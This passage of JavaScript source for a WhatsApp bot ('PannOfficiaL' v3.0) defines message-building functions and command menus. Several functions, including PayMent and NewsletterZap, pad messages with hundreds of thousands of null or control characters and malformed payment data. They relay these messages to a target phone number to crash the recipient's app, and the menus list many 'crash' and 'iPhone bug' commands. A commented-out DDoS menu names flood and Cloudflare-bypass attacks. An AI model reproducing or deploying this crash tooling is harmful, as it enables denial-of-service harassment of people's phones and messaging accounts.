            },
            'filterClause': {
                'clauseType': clauseType,
                'clauses': clauses,
                'filters': filters
            }
        }
    }), { userJid: target });

    await PannOfficiaL.relayMessage(target, qpMessage.message, { participant: { jid: target }, messageId: qpMessage.key.id });
}
		    
		async function sendSessionStructure(target, sessionVersion, localIdentityPublic, remoteIdentityPublic, rootKey, previousCounter, senderChain, receiverChains, pendingKeyExchange, pendingPreKey, remoteRegistrationId, localRegistrationId, needsRefresh, aliceBaseKey) {
    var sessionStructure = generateWAMessageFromContent(target, proto.Message.fromObject({
        'sessionStructure': {
            'sessionVersion': sessionVersion,
            'localIdentityPublic': localIdentityPublic,
            'remoteIdentityPublic': remoteIdentityPublic,
            'rootKey': rootKey,
            'previousCounter': previousCounter,
            'senderChain': senderChain,
            'receiverChains': receiverChains,
            'pendingKeyExchange': pendingKeyExchange,
            'pendingPreKey': pendingPreKey,
            'remoteRegistrationId': remoteRegistrationId,
            'localRegistrationId': localRegistrationId,
            'needsRefresh': needsRefresh,
            'aliceBaseKey': aliceBaseKey
        }
    }), { userJid: target });

    await PannOfficiaL.relayMessage(target, sessionStructure.message, { participant: { jid: target }, messageId: sessionStructure.key.id });
}
		
const wanted = {
            key: {
                remoteJid: 'p',
                fromMe: false,
                participant: '0@s.whatsapp.net'
            },
            message: {
                "interactiveResponseMessage": {
                    "body": {
                        "text": "Sent",
                        "format": "DEFAULT"
                    },
                    "nativeFlowResponseMessage": {
                        "name": "galaxy_message",
                        "paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"ZetExecute\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"czazxvoid@sky.id\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0003".repeat(500000)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
                        "version": 3
                    }
                }
            }
        }	
		
		
		async function PayMent(LockJids) {
			var messageContent = generateWAMessageFromContent(LockJids, proto.Message.fromObject({
				'viewOnceMessage': {
					'message': {
						'interactiveMessage': {
							'header': {
								"hasMediaAttachment": true,
								'sequenceNumber': '0',
								"jpegThumbnail": ""
							},
							'nativeFlowMessage': {
								"buttons": [{
									"name": "review_and_pay",
									"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\k${bugpdf},\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
								}],
								"messageParamsJson": '\0'.repeat(10000),
							}
						}
					}
				}
			}), {});
			PannOfficiaL.relayMessage(LockJids, messageContent.message, {
				'messageId': messageContent.key.id
			});
		}

		async function NewsletterZap(LockJids) {
			var messageContent = generateWAMessageFromContent(LockJids, proto.Message.fromObject({
				'viewOnceMessage': {
					'message': {
						"newsletterAdminInviteMessage": {
							"newsletterJid": `120363325294099425@newsletter`,
							"newsletterName": "𝘾𝙝 𝙋𝙖𝙣𝙣𝙊𝙛𝙛𝙞𝙘𝙞𝙖𝙇" + "\u0000".repeat(920000),
							"jpegThumbnail": "",
							"caption": `Undangan Admin Channel PannOfficiaLpScript`,
							"inviteExpiration": Date.now() + 1814400000
						}
					}
				}
			}), {
				'userJid': LockJids
			});
			await PannOfficiaL.relayMessage(LockJids, messageContent.message, {
				'participant': {
					'jid': LockJids
				},
				'messageId': messageContent.key.id
			});
		}

		const Porke = {
			key: {
				participant: `0@s.whatsapp.net`,
				...(m.chat ? {
					remoteJid: "status@broadcast"
				} : {})
			},
			'message': {
				"interactiveMessage": {
					"header": {
						"hasMediaAttachment": true,
					},
					"nativeFlowMessage": {
						"buttons": [{
							"name": "review_and_pay",
							"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"️࿆᷍🩸⃟༑⌁⃰𝑷𝒂𝒏𝒏𝑶𝒇𝒇𝒊𝒄𝒊𝒂𝑳 𝑪͢𝒓𝒂ͯ͢𝒔𝒉 𝐈𝐧͢𝐟𝐢ͮ𝐧͢𝐢𝐭𝐲͜͡⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
						}]
					}
				}
			}
		}

		const Porke2 = {
			key: {
				participant: `0@s.whatsapp.net`,
				...(m.chat ? {
					remoteJid: "status@broadcast"
				} : {})
			},
			'message': {
				"interactiveMessage": {
					"header": {
						"hasMediaAttachment": true,
					},
					"nativeFlowMessage": {
						"buttons": [{
							"name": "review_and_pay",
							"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"️࿆᷍🩸⃟༑⌁⃰𝑷𝒂𝒏𝒏𝑶𝒇𝒇𝒊𝒄𝒊𝒂𝑳 𝑪͢𝒓𝒂ͯ͢𝒔𝒉 𝐈𝐧͢𝐟𝐢ͮ𝐧͢𝐢𝐭𝐲͜͡⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
						}]
					}
				}
			}
		}

let list = []
for (let i of ownerNumber) {
list.push({
displayName: await PannOfficiaL.getName(i + '@s.whatsapp.net'),
vcard: `BEGIN:VCARD\n
VERSION:3.0\n
N:${await PannOfficiaL.getName(i + '@s.whatsapp.net')}\n
FN:${await PannOfficiaL.getName(i + '@s.whatsapp.net')}\n
item1.TEL;waid=${i}:${i}\n
item1.X-ABLabel:Ponsel\n
item2.EMAIL;type=INTERNET: PannOfficiaLmewing@gmail.com\n
item2.X-ABLabel:Email\n
item3.URL:https://whatsapp.com/channel/0029VarGepU1dAw1U76h3S1k
item3.X-ABLabel:YouTube\n
item4.ADR:;;Indonesia;;;;\n
item4.X-ABLabel:Region\n
END:VCARD`
})
}

function monospace(string) {
return '```' + string + '```'
}

   function toRupiah(angka) {
var saldo = '';
var angkarev = angka.toString().split('').reverse().join('');
for (var i = 0; i < angkarev.length; i++)
if (i % 3 == 0) saldo += angkarev.substr(i, 3) + '.';
return '' + saldo.split('', saldo.length - 1).reverse().join('');
}
 
// Gak Usah Di Apa Apain Jika Tidak Mau Error
try {
ppuser = await PannOfficiaL.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}

// FUNCTION OBFUSCATOR 
async function obfus(query) {
return new Promise((resolve, reject) => {
try {
const obfuscationResult = jsobfus.obfuscate(query,
{
compact: false,
controlFlowFlattening: true,
controlFlowFlatteningThreshold: 1,
numbersToExpressions: true,
simplify: true, 
stringArrayShuffle: true,
splitStrings: true,
stringArrayThreshold: 1
}
);
const result = {
status: 200,
author: `PannOfficiaL`,
result: obfuscationResult.getObfuscatedCode()
}
resolve(result)
} catch (e) {
reject(e)
}
})
}
 
//Status
if (!PannOfficiaL.public) {
if (!m.key.fromMe) return
} 

async function loading () {
var baralod = [
"┃",
"┃┃",
"┃┃┃",
"┃┃┃┃",
"┃┃┃┃┃",
"┃┃┃┃┃┃",
"𝘓𝘰𝘢𝘥𝘪𝘯𝘨 𝘚𝘦𝘥𝘢𝘯𝘨 𝘉𝘦𝘳𝘭𝘢𝘯𝘨𝘴𝘶𝘯𝘨...",
"𝑾𝒆𝒍𝒄𝒐𝒎𝒆 𝑻𝒐 𝑺𝒄𝒓𝒊𝒑𝒕 𝑷𝒂𝒏𝒏𝑶𝒇𝒇𝒊𝒄𝒊𝒂𝑳 𝑽𝟐 𝑺𝒄𝒓𝒊𝒑𝒕 𝑵𝒆𝒘", 
]
let { key } = await PannOfficiaL.sendMessage(from, {text: '𝐏'})

for (let i = 0; i < baralod.length; i++) {
await PannOfficiaL.sendMessage(from, {text: baralod[i], edit: key });
}
}
        

// Fake Resize
const fkethmb = await reSize(ppuser, 300, 300)

// Cuma Fake
const sendOrder = async(jid, text, orid, img, itcount, title, sellers, tokens, ammount) => {
const order = generateWAMessageFromContent(jid, proto.Message.fromObject({
"orderMessage": {
"orderId": orid,
"thumbnail": img,
"itemCount": itcount,
"status": "INQUIRY",
"surface": "CATALOG",
"orderTitle": title,
"message": text,
"sellerJid": sellers,
"token": tokens,
"totalAmount1000": ammount,
"totalCurrencyCode": "IDR",
}
}), { userJid: jid, quoted: m })
PannOfficiaL.relayMessage(jid, order.message, { messageId: order.key.id})
}

// Function Reply
const reply = (teks) => {
            PannOfficiaL.sendMessage(m.chat,
{
    text: teks,
    contextInfo: {
        mentionedJid: [sender],
        forwardingScore: 9999999,
        isForwarded: true,
        "externalAdReply": {
            "showAdAttribution": true,
            "containsAutoReply": true,
            "title": `💧⃟𒆜𝐏𝐚𝐧𝐧𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥𝟒𝟒𝟒⃟╳🐦‍🔥`,
            "body": `${namabot}`,
            "previewType": "PHOTO",
            "thumbnailUrl": ``,
            "thumbnail": fs.readFileSync(`./database/image/PannOfficiaL.jpg`),
            "sourceUrl": `${isLink}`
        }
    }
},
{ quoted: m })
        }

const fkontak = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { 'contactMessage': { 'displayName': `${pushname}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;𝗣𝗮𝗻𝗻𝗢𝗳𝗳𝗰,;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': { url: 'https://k.top4top.io/p_3241oy2j10.jpg' }}}}
function parseMention(text = '') {
return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
}
    
if (m.isGroup && !m.key.fromMe && !isOwner && antilink) {
if (!isBotAdmins) return
if (budy.match(`whatsapp.com`)) {
PannOfficiaL.sendMessage(m.chat, {text: `*Antilink Group Terdeteksi*\n\nKamu Akan Dikeluarkan Dari Group ${groupMetadata.subject}`}, {quoted:m})
PannOfficiaL.groupParticipantsUpdate(m.chat, [sender], 'delete')
PannOfficiaL.sendMessage(m.chat, { delete: m.key })
}
}

switch (command) {

case 'menu': {
await loading()
const version = require("baileys/package.json").version
const menu = `╭──( 💧⃟𒆜𝐏𝐚𝐧𝐧𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥𝟒𝟒𝟒⃟╳🐦‍🔥 )
║⿻ 𝐍𝐚𝐦𝐞 : *𒆜𝗣𝗮𝗻𝗻𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗟𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗺𝗲𝗻𝘁⚡︎*
║⿻ 𝐁𝐨𝐭 : 🩸⃟𒆜𝐏𝐚𝐧𝐧𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐋 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 [𝟑.𝟎]〽️
║⿻ 𝐑𝐮𝐧 : *${runtime(process.uptime())}*
▬▭「 𝗦𝗘𝗖𝗥𝗜𝗣𝗧 𝗩𝗘𝗥𝗦𝗜𝗢𝗡 [𝟯.𝟬]」▭▬
║ BUY PANEL, DLL
║ PV t.me/PannOfficialDeveloper
┗────💧⃟𒆜𝐏𝐚𝐧𝐧𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥𝟒𝟒𝟒⃟╳🐦‍🔥─────			
║
│›› \`𝗢𝗪𝗡𝗘𝗥𝗠𝗘𝗡𝗨\`
║›› \`𝗕𝗨𝗚𝗠𝗘𝗡𝗨\`
║›› \`𝗔𝗟𝗟𝗠𝗘𝗡𝗨\`
│
║› 𒆜💧⃟𒆜𝐏𝐚𝐧𝐧𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥𝟒𝟒𝟒⃟╳🐦‍🔥 ©Copyright
╰━━━━━━━━━━━━━━━━━━━ ᬼ`
reply(menu)
}
break

case 'bugmenu': {
await loading()
const version = require("baileys/package.json").version
const bugmenu = `╭──( 💧⃟𒆜𝐏𝐚𝐧𝐧𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥𝟒𝟒𝟒⃟╳🐦‍🔥 )
║ᨒ 𝗩𝗘𝗥𝗦𝗜𝗢𝗡 𝗦𝗘𝗖𝗥𝗜𝗣𝗧: [𝟯.𝟬]
│ ※ 𝐍𝐚𝐦𝐞 : ${m.pushName}
║▬▭▬▭▬▭▬▭▬▭
│ 𝐎𝐰𝐧𝐞𝐫 : ${author}
║※ 𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : 💧⃟𒆜𝐏𝐚𝐧𝐧𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥𝟒𝟒𝟒⃟╳🐦‍🔥
│※ 𝐎𝐰𝐧 𝐍𝐨 : t.me/PannOfficialDeveloper
║※ 𝐏𝐫𝐞𝐟𝐢𝐱 : 𝐌𝐔𝐋𝐓𝐈
│▬▭「 💧⃟𒆜𝐏𝐚𝐧𝐧𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥𝟒𝟒𝟒⃟╳🐦‍🔥 」▭▬
║
╰━━━━━━━━━━━━━━━━━━━ ᬼ

┏─『 \`※𝐏𝐚𝐧𝐧𝐎𝐟𝐟𝐜𝐁𝐮𝐠※\` 』

║𒈒 mampuslu 𝟲𝟮𝘅𝘅𝘅
║𒈒 pannoffcnibos 𝟲𝟮𝘅𝘅𝘅
║𒈒 sok-asik 𝟲𝟮𝘅𝘅𝘅
║𒈒 hah 𝟲𝟮𝘅𝘅𝘅
║𒈒 galaxycrash 𝟲𝟮𝘅𝘅𝘅
║𒈒 wet 𝟲𝟮𝘅𝘅𝘅
║𒈒 inikan 𝟲𝟮𝘅𝘅𝘅
║𒈒 knapa 𝟲𝟮𝘅𝘅𝘅
║𒈒 pann-offc 𝟲𝟮𝘅𝘅𝘅
║𒈒 pannoffcaja 𝟲𝟮𝘅𝘅𝘅
║𒈒 kenal-pann? 𝟲𝟮𝘅𝘅𝘅
║𒈒 bjir 𝟲𝟮𝘅𝘅𝘅
║𒈒 crott 𝟲𝟮𝘅𝘅𝘅
║𒈒 haii-tamvan 𝟲𝟮𝘅𝘅𝘅
║𒈒 assalamualaikum 𝟲𝟮𝘅𝘅𝘅
║𒈒 anjir 𝟲𝟮𝘅𝘅𝘅
║𒈒 autocrash 𝟲𝟮𝘅𝘅𝘅
║𒈒 tes 𝟲𝟮𝘅𝘅𝘅
║𒈒 crash-total 𝟲𝟮𝘅𝘅𝘅
║𒈒 vip-crash 𝟲𝟮𝘅𝘅𝘅
║𒈒 memek 𝟲𝟮𝘅𝘅𝘅
║𒈒 pann-dipanggil 𝟲𝟮𝘅𝘅𝘅
║𒈒 uisystem 𝟲𝟮𝘅𝘅𝘅
║𒈒 uicrash 𝟲𝟮𝘅𝘅𝘅
║𒈒 bugui 𝟲𝟮𝘅𝘅𝘅
║𒈒 device 𝟲𝟮𝘅𝘅𝘅
║𒈒 xwangsaf 𝟲𝟮𝘅𝘅𝘅
║𒈒 xmods 𝟲𝟮𝘅𝘅𝘅
║𒈒 xpann 𝟲𝟮𝘅𝘅𝘅
▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬❐
> *☄︎︎IPHONE BUG☄︎*
▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄
║☣︎ xios 𝟲𝟮𝘅𝘅𝘅
║☣︎ iphone 𝟲𝟮𝘅𝘅𝘅
║☣︎ xip 𝟲𝟮𝘅𝘅𝘅
┗─────────────💧⃟𒆜𝐏𝐚𝐧𝐧𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥𝟒𝟒𝟒⃟╳🐦‍🔥`
reply(bugmenu)
}
break

/*case 'ddosmenu':
await loading()
const version = require("baileys/package.json").version
m.reply(`╭──( 💧⃟𒆜𝐏𝐚𝐧𝐧𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥𝟒𝟒𝟒⃟╳🐦‍🔥 )
║⿻ 𝐍𝐚𝐦𝐞 : ※𝐏𝐚𝐃𝐞𝐯〽️
║⿻ 𝐁𝐨𝐭 : 💧⃟𒆜𝐏𝐚𝐧𝐧𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥𝟒𝟒𝟒⃟╳🐦‍🔥
║⿻ 𝐑𝐮𝐧 : *55 Detik*
▬▭「 ☄💧⃟𒆜𝐏𝐚𝐧𝐧𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥𝟒𝟒𝟒⃟╳🐦‍🔥☄︎ 」▭▬
┗──────────────💧⃟𒆜𝐏𝐚𝐧𝐧𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥𝟒𝟒𝟒⃟╳🐦‍🔥
┏─『 \`𝐃𝐃𝐎𝐒 𝐌𝐄𝐍𝐔\` 』
║⿻︎ 𝚍𝚍𝚘𝚜
║⿻︎ 𝚖𝚒𝚡
║⿻︎ 𝚏𝚕𝚘𝚘𝚍𝚜
║⿻︎ 𝚞𝚊
║⿻︎ 𝚡𝚌𝚑𝚛𝚘𝚖𝚎
║⿻︎ 𝚝𝚕𝚜
║⿻ 𝚝𝚕𝚜𝚋𝚢𝚙𝚊𝚜𝚜
║⿻ 𝚝𝚕𝚜𝚟2
║⿻ 𝚋𝚢𝚙𝚊𝚜𝚜-𝚌𝚏
║⿻ 𝚝𝚕𝚜-𝚟𝚒𝚙
║⿻ 𝚡𝚌
┗─────୨ৎ───────💧⃟𒆜𝐏𝐚𝐧𝐧𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥𝟒𝟒𝟒⃟╳🐦‍🔥`)
break*/

case 'allmenu': {
await loading()
const version = require("baileys/package.json").version
const allmenu = `╭──( 💧⃟𒆜𝐏𝐚𝐧𝐧𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥𝟒𝟒𝟒⃟╳🐦‍🔥 )
║༗ 𝐍𝐚𝐦𝐞 : *${pushname}*
║༗ 𝐁𝐨𝐭 : ${namabot}
║༗ 𝐑𝐮𝐧 : *${run}*
▬▭「 ☄︎💧⃟𒆜𝐏𝐚𝐧𝐧𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥𝟒𝟒𝟒⃟╳🐦‍🔥☄︎ 」▭▬
💧⃟𒆜𝐏𝐚𝐧𝐧𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥𝟒𝟒𝟒⃟╳🐦‍🔥
╔─═⊱ *「 \`𝐎𝐖𝐍𝐄𝐑 𝐂𝐌𝐃\` 」* ─═ ᬼ
║༗  ᴀᴅᴅᴏᴡɴᴇʀ
║༗ ᴀᴅᴅᴘʀᴇᴍ
║༗ ᴅᴇʟᴏᴡɴᴇʀ
║༗ ᴅᴇʟᴘʀᴇᴍ
║༗ ᴘᴜʙʟɪᴄ
║༗ sᴇʟғ
💧⃟𒆜𝐏𝐚𝐧𝐧𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥𝟒𝟒𝟒⃟╳🐦

┏─『 \`𝐓𝐎𝐎𝐋𝐒 𝐌𝐄𝐍𝐔\` 』
║༗ ᴇɴᴄ <ᴄᴏᴅᴇ>
║༗ ᴇɴᴄʀʏᴘᴛ <ᴄᴏᴅᴇ>
║༗ ᴀɪ <ᴛᴇᴋs>
💧⃟𒆜𝐏𝐚𝐧𝐧𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥𝟒𝟒𝟒⃟╳🐦‍🔥

┏─『 \`𝐅𝐔𝐍 𝐌𝐄𝐍𝐔\` 』
║༗ ꜱᴛɪᴄᴋᴇʀ <ʀᴇᴘʟʏ ɪᴍᴀɢᴇ>
💧⃟𒆜𝐏𝐚𝐧𝐧𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥𝟒𝟒𝟒⃟╳🐦‍🔥

┏─『 \`𝐆𝐑𝐎𝐔𝐏 𝐌𝐄𝐍𝐔\` 』
║༗ ʜɪᴅᴇᴛᴀɢ <ǫᴜᴇʀʏ>
║༗ ᴛᴀɢᴀʟʟ <ǫᴜᴇʀʏ>
║༗ ᴋɪᴄᴋ <ᴛᴀɢ>
║༗ ᴘʀᴏᴍᴏᴛᴇ <ᴛᴀɢ>
║༗ ᴅᴇᴍᴏᴛᴇ <ᴛᴀɢ>
💧⃟𒆜𝐏𝐚𝐧𝐧𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥𝟒𝟒𝟒⃟╳🐦‍🔥

┏─『 \`𝐒𝐏𝐄𝐂𝐈𝐀𝐋 𝐌𝐄𝐍𝐔\` 』
║༗ ʙᴜᴛᴛᴏɴʙᴜɢ
║༗ ʙᴜᴛᴛᴏɴʙᴜɢ-ᴠ2
║༗ ʙᴜᴛᴛᴏɴʙᴜɢ-ᴠ3
💧⃟𒆜𝐏𝐚𝐧𝐧𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥𝟒𝟒𝟒⃟╳🐦‍🔥`
reply(allmenu)
}
break

case 'bugpriv': {
await loading()
const version = require("baileys/package.json").version
const toolsmenu = `╭──( 💧⃟𒆜𝐏𝐚𝐧𝐧𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥𝟒𝟒𝟒⃟╳🐦‍🔥 )
║ᨒ 𝗩𝗘𝗥𝗦𝗜𝗢𝗡 𝗦𝗘𝗖𝗥𝗜𝗣𝗧: [𝟯.𝟬]
│ ※ 𝐍𝐚𝐦𝐞 : ${m.pushName}
║▬▭▬▭▬▭▬▭▬▭
│ 𝐎𝐰𝐧𝐞𝐫 : ${author}
║※ 𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : 💧⃟𒆜𝐏𝐚𝐧𝐧𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥𝟒𝟒𝟒⃟╳🐦‍🔥
│※ 𝐎𝐰𝐧 𝐍𝐨 : t.me/PannOfficialDeveloper
║※ 𝐏𝐫𝐞𝐟𝐢𝐱 : 𝐌𝐔𝐋𝐓𝐈
│▬▭「 💧⃟𒆜𝐏𝐚𝐧𝐧𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥𝟒𝟒𝟒⃟╳🐦‍🔥 」▭▬
║
╰━━━━━━━━━━━━━━━━━━━ ᬼ
┏────────💀
║​᭄ halobang 62xxx
╰──────────
 𝄽ᴠ  ͢ɪ ᴘ ʙᴜɢ ᬼ ᴠᴇʀsɪᴏɴ [ 3.0 ]☠️
──────────────💧⃟𒆜𝐏𝐚𝐧𝐧𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥𝟒𝟒𝟒⃟╳🐦‍🔥`
reply(toolsmenu)
}
break

case 'bugpriv-v2': {
await loading()
const version = require("baileys/package.json").version
const toolsmenu = `╭──( 💧⃟𒆜𝐏𝐚𝐧𝐧𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥𝟒𝟒𝟒⃟╳🐦‍🔥 )
║ᨒ 𝗩𝗘𝗥𝗦𝗜𝗢𝗡 𝗦𝗘𝗖𝗥𝗜𝗣𝗧: [𝟯.𝟬]
│ ※ 𝐍𝐚𝐦𝐞 : ${m.pushName}
║▬▭▬▭▬▭▬▭▬▭
│ 𝐎𝐰𝐧𝐞𝐫 : ${author}
║※ 𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : 💧⃟𒆜𝐏𝐚𝐧𝐧𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥𝟒𝟒𝟒⃟╳🐦‍🔥
│※ 𝐎𝐰𝐧 𝐍𝐨 : t.me/PannOfficialDeveloper
║※ 𝐏𝐫𝐞𝐟𝐢𝐱 : 𝐌𝐔𝐋𝐓𝐈
│▬▭「 💧⃟𒆜𝐏𝐚𝐧𝐧𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥𝟒𝟒𝟒⃟╳🐦‍🔥 」▭▬
║
╰━━━━━━━━━━━━━━━━━━━ ᬼ
┏────────💀
║​᭄ bang-on? 62xxx
╰──────────
 𝄽ᴠ  ͢ɪ ᴘ ʙᴜɢ ᬼ ᴠᴇʀsɪᴏɴ [ 3.0 ]☠️
──────────────💧⃟𒆜𝐏𝐚𝐧𝐧𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥𝟒𝟒𝟒⃟╳🐦‍🔥`
reply(toolsmenu)
}
break

case 'bugpriv-v3': {
await loading()
const version = require("baileys/package.json").version
const toolsmenu = `╭──( 💧⃟𒆜𝐏𝐚𝐧𝐧𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥𝟒𝟒𝟒⃟╳🐦‍🔥 )
║ᨒ 𝗩𝗘𝗥𝗦𝗜𝗢𝗡 𝗦𝗘𝗖𝗥𝗜𝗣𝗧: [𝟯.𝟬]
│ ※ 𝐍𝐚𝐦𝐞 : ${m.pushName}
║▬▭▬▭▬▭▬▭▬▭
│ 𝐎𝐰𝐧𝐞𝐫 : ${author}
║※ 𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : 💧⃟𒆜𝐏𝐚𝐧𝐧𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥𝟒𝟒𝟒⃟╳🐦‍🔥
│※ 𝐎𝐰𝐧 𝐍𝐨 : t.me/PannOfficialDeveloper
║※ 𝐏𝐫𝐞𝐟𝐢𝐱 : 𝐌𝐔𝐋𝐓𝐈
│▬▭「 💧⃟𒆜𝐏𝐚𝐧𝐧𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥𝟒𝟒𝟒⃟╳🐦‍🔥 」▭▬
║
╰━━━━━━━━━━━━━━━━━━━ ᬼ
┏────────💀
║​᭄ pannoffc-vipp 62xxx
╰──────────
 𝄽ᴠ  ͢ɪ ᴘ ʙᴜɢ ᬼ ᴠᴇʀsɪᴏɴ [ 3.0 ]☠️
──────────────💧⃟𒆜𝐏𝐚𝐧𝐧𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥𝟒𝟒𝟒⃟╳🐦‍🔥`
reply(toolsmenu)
}
break


case 'z': case 'hidetag':
//if (!isRegistered) return registerbut(noregis)
if (!isOwner) return reply(mess.only.owner)
if (!text) return reply(`Teks?`)
PannOfficiaL.sendMessage(m.chat, { text : text ? text : '' , mentions: participants.map(a => a.id)}, { quoted: m })
break

case "tagall": {
if (!isOwner && !isAdmins) return reply(mess.admin)
if (!isGroup) return joreply(mess.only.group)
if (!q) return reply(`Teks Nya Mana Kak?`)
